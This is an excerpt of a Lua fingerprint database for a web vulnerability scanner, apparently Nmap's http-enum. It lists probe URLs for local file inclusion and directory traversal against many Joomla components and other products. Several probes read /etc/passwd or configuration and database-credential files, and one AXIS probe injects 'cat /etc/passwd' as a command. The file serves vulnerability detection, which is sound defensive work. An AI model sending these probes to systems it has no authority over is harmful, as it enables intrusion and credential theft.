...
table.insert(fingerprints, {
  ...
  probes = {
    {
      path = '/index.php?option=com_acooldebate&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_addressbook&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_arcadegames&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_archeryscores&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_awdwall&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_awiki&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_beeheard&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_beeheardlite&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_biblestudy&id=1&view=studieslist&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_bca-rss-syndicator&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_bsadv&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_canteen&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_ccnewsletter&view=ccnewsletter&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_ccnewsletter&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_ckforms&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_communitypolls&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_cvmaker&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_dailymeals&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_datafeeds&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_diary&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_drawroot&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_advertising&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_econtent&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_fabrik&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_flashgames&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_frontenduseraccess&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_g2bridge&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_gadgetfactory&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_galleryxml&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_ganalytics&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_gcalendar&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_google&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_graphics&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_hsconfig&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_horoscope&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_if_surfalert&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jcollection&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jfeedback&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jgrid&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jinventory&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_joomlaflickr&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_joomlapicasa2&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_joommail&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jphone&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jprojectmanager&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jresearch&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jukebox&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_juliaportfolio&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_jvehicles&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_linkr&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_market&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_mediqna&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_memory&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_mmsblog&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_mscomment&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_mtfireeagle&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_multimap&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_multiroot&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_myfiles&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_ninjarsssyndicator&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_news_portal&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_noticeboard&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_obsuggest&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_onlineexam&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_orgchart&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_perchacategoriestree&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_perchadownloadsattach&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_perchafieldsattach&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_perchagallery&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_perchaimageattach&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_picasa2gallery&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_preventive&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_properties&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_record&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_rokdownloads&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_rpx&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_rwcards&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_sectionex&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_shoutbox&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_simpledownload&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_smestorage&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_spsnewsletter&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_svmap&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_sweetykeeper&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_travelbook&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_tweetla&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_userstatus&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_vjdeo&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_webeecomment&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_weberpcustomer&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_webtv&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_wgpicasa&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_wmi&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_worldrates&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_zimbcomment&controller=../../../LICENSE',
      method = 'GET'
    },
    {
      path = '/index.php?option=com_ztautolink&controller=../../../LICENSE',
      method = 'GET'
    }
  },
  matches = {
    {
      match = 'GNU GENERAL PUBLIC LICENSE',
      output = 'Joomla Component Local File Include'
    },
  }
});
...
table.insert(fingerprints, {
    ...
    probes = {
      {
        path = '/browse.php?p=source&file=/etc/passwd',
        method = 'GET'
      }
    },
    matches = {
      {
        match = 'root:.*:0:[01]:',
        output = 'PowerBrowse Local File Include'
      },
    }
  });
...
table.insert(fingerprints, {
    ...
    probes = {
      {
        path = '/cgi-bin/chklogin.cgi?file=config.ini',
        method = 'GET'
      }
    },
    matches = {
      {
        match = 'account.admin.user_id',
        output = 'Siemens IP Camera Auth Bypass Configuration Download'
      }
    }
  });
...
table.insert(fingerprints, {
    ...
    matches = {
      {
        match = 'root:.*:0:[01]:',
        output = 'ZYCOO IP Phone System - Remote Command Execution'
      }
    }
  });
...
table.insert(fingerprints, {
    ...
    probes = {
      {
        path = "/htdocs/fileinfo.php?sha1=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        method = 'GET'
      }
    },
    matches = {
      {
        match = 'root:.*:0:[01]:',
        output = 'PHP File Vault 0.9 - Directory Traversal'
      }
    }
  });
...
table.insert(fingerprints, {
    ...
    probes = {
      {
        path = "/tiki-15.0/vendor/player/flv/flv_stream.php?file=../../../db/local.php&position=0",
        method = 'GET'
      }
    },
    matches = {
      {
        match = "$user_tiki='(.-)';\n$pass_tiki=%'(.-)%';.*",
        output = 'Tiki Wiki CMS 15.0 - Arbitrary File Download (DB user:\\1 pass:\\2)'
      }
    }
  });
...
table.insert(fingerprints, {
    ...
    probes = {
      {
        path = "app_license.shtml?app=ORWELLLABS%3Bcat%20/etc/passwd",
        method = 'GET'
      }
    },
    matches = {
      {
        match = 'root:.*:0:[01]:',
        output = 'Multiple AXIS Products - Multiple Remote Command Execution Vulnerabilities (CVE-2015-8257)'
      }
    }
  });
  ...
  for l in io.lines(nikto_db_path) do
    ...
    if not string.match(l, "^#.*") then
      ...
      if not exists
        ...
        file = io.open("nikto.txt", "a")
        file:write("    probes = {", "\n") 
        file:write("      {", "\n") 
        file:write("        path = [[", record[4], "]],\n") 
        file:write("        method = '", record[5], "',\n") 
        file:write("      }", "\n") 
        file:write("    },", "\n") 
        file:write("    matches = {", "\n") 
        file:write("      {", "\n") 
        file:write("        dontmatch = [[",record[9], "]],\n") 
        file:write("        match = '", record[6], "',\n") 
        file:write("        output = [[", record[11], "]],\n") 
        file:write("      }", "\n") 
        file:write("    }", "\n") 
